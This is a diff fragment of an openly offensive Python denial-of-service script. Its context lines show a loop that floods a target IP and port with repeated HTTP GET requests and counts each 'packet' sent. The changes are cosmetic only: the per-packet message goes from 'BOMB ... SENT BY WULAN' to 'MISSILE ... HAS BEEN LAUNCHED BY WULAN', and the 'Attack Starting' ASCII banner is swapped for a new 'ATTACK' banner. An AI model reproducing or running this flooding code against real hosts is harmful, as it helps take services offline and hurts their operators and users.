@@ -78,7 +78,7 @@ def goForDosThatThing():
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< BOMB " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SENT BY WULAN AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
+                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-< MISSILE " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " HAS BEEN LAUNCHED BY WULAN AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-")
                         Count.packetCounter = Count.packetCounter + 1
                     except socket.error:
                         print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
@@ -94,12 +94,11 @@ def goForDosThatThing():
 try:
         
     print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
-    _   _   _             _      ____  _             _   _             
-   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
-  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
- / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
-/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
-                                                                 |___/ 
+╭━━┳━━┳━━┳━━┳━┳┳╮
+┃╭╮┣╮╭┻╮╭┫╭╮┃╭┫╭╯
+┃┣┫┃┃┃╱┃┃┃┣┫┃╰┫╰╮
+╰╯╰╯╰╯╱╰╯╰╯╰┻━┻┻╯ 
+
           ''')
     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
     time.sleep(1)
